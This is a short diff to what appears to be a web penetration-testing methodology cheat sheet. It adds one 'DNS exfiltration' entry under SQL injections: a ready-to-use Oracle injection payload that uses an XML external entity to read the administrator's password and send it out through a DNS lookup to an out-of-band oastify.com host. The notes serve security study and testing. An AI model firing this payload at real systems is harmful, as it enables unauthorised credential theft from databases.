@@ -16,6 +16,9 @@ Directory fuzzing list [here](https://github.com/danielmiessler/SecLists/blob/ma
 
 ## Step 3 - Identify vulnrabilities
 ### SQL injections
+#### DNS exfiltration
+Oracle - `'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % bjgsg SYSTEM "http://'||(select password from users where username='administrator')||'.8clatdya2m9x02ta9zxozvbmyd44svgk.oastify.com/">%bjgsg;]>'),'/l') from dual)||'`
+
 ### NoSQL injections
 ### Authentication
 ### Path traversal
